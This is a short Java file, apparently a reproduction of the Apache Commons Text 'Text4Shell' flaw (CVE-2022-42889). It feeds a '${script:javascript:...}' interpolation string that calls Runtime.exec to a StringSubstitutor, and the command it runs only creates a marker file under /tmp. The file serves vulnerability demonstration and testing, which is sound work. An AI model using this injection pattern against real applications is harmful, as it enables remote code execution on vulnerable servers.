package org.acme.ssti;

import org.apache.commons.text.StringSubstitutor;

public class UnsafeInterpolator {
    public static void main(String[] args) {
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        String out = interpolator.replace("${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/CVE-2022-42889')}");
        System.out.println(out);
    }
}